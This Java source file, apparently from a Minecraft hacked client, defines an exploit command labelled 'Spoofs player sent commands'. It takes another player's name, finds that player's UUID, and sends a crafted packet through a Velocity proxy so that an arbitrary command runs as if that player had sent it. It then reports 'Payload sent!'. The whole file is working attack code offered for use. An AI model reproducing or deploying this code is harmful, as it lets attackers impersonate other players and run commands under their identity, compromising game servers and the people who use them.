package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.paradise_client.*;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

public class SignedVelocityCommand extends Command {
  public SignedVelocityCommand() {
    super("signedvelocity", "Spoofs player sent commands", CommandManager.CommandCategory.EXPLOIT);
  }

  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes(this::incompleteCommand)
      .then(argument("user", StringArgumentType.word()).suggests(this::suggestOnlinePlayers)
        .executes(this::incompleteCommand)
        .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
          String user = context.getArgument("user", String.class);
          for (PlayerListEntry p : getMinecraftClient().getNetworkHandler().getPlayerList()) {
            if (p.getProfile().getName().equalsIgnoreCase(user)) {
              String uuid = p.getProfile().getId().toString();
              String command = context.getArgument("command", String.class);
              PacketFactory.sendSV(uuid, command);
              Helper.printChatMessage("Payload sent!");
              return SINGLE_SUCCESS;
            }
          }

          Helper.printChatMessage("Player not found!");
          return SINGLE_SUCCESS;
        })));
  }
}
